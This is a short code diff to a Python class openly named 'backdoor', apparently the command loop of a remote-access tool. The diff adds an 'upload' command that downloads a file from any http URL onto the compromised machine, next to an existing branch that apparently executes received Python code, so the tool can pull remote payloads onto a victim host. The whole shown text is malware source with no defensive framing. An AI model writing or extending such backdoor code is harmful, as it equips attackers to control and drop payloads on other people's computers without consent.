@@ -156,7 +156,21 @@ class backdoor:
                 except Exception:
                     output += "Error\n"
                 
-
+            elif command.startswith("upload"):
+                upload_command = command.split("(")
+                file_to_upload = upload_command[1].replace(")", "")
+                file_to_upload = file_to_upload.replace('"','')
+                file_to_upload = file_to_upload.replace("'","")
+                try:
+                    # file_to_upload is url just download it
+                    if file_to_upload.startswith("http"):
+                        file = requests.get(file_to_upload)
+                        with open(file_to_upload.split("/")[-1], "wb") as f:
+                            f.write(file.content)
+                        output += "Downloaded " + file_to_upload.split("/")[-1] + "\n"
+                        continue
+                except Exception as e:
+                    output += "Error: " + str(e) + "\n"
             elif command.startswith("python"):
                 python_code = ""
                 for i in range(1, len(commands_to_execute)):
